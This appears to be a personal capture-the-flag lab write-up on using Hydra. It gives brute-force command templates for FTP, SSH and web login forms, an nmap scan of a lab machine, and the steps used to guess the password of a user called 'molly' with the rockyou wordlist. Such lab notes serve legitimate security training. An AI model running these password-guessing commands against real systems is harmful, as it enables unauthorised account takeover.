Hydra Commands
hydra -l user -P passlist.txt ftp://MACHINE_IP

//SSH Commands
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
-l	specifies the (SSH) username for login
-P	indicates a list of passwords
-t	sets the number of threads to spawn


Post Web Form
sudo hydra <username> <wordlist> 10.49.132.98 http-post-form "<path>:<login_credentials>:<invalid_response>"
-l	the username for (web form) login
-P	the password list to use
http-post-form	The type of the form is POST
<path>	the login page URL, for example, login.php
<login_credentials>	the username and password used to log in, for example, username=^USER^&password=^PASS^
<invalid_response>	part of the response when the login fails
-V	verbose output for every attempt


hydra -l <username> -P <wordlist> 10.49.132.98 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
The login page is only /, i.e., the main IP address.
The username is the form field where the username is entered
The specified username(s) will replace ^USER^
The password is the form field where the password is entered
The provided passwords will be replacing ^PASS^
Finally, F=incorrect is a string that appears in the server reply when the login fails
On a side note, if the web server is listening on a non-default port number, you can explicitly specify the port number using -s <port>, for example:

hydra -l <username> -P <wordlist> 10.49.132.98 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V

///// Use Hydra to brute-force molly's web password. What is the value of flag 1?

root@ip-10-49-163-68:~# nmap -sC -sV -p- 10.49.132.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-02 11:30 UTC
Nmap scan report for ip-10-49-132-98.ap-south-1.compute.internal (10.49.132.98)
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:a6:c7:c2:26:ff:fa:52:fc:63:54:b8:b5:24:5a:4a (RSA)
|   256 7b:6c:d8:be:88:bf:f6:86:42:4d:3d:c0:93:5d:91:ed (ECDSA)
|_  256 73:8a:3a:58:52:6c:df:d9:8a:4f:68:ca:46:23:e6:ff (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Hydra Challenge
|_Requested resource was /login
MAC Address: 0A:29:A1:85:0D:EF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

used Gobuster to enumerate the directories and found /login page :-
http://10.49.132.98/login -> website found 



brute force the login page using hydra ////
hydra -l molly -P rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
view page source to find the flag



bruteforce the ssh using hydra with help of following command
hydra -l molly -P rockyou.txt <ip> ssh
login using the pass and use cat to view the password 


some attachments of the full process 
![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)
![alt text](image-4.png)
![alt text](image-3.png)
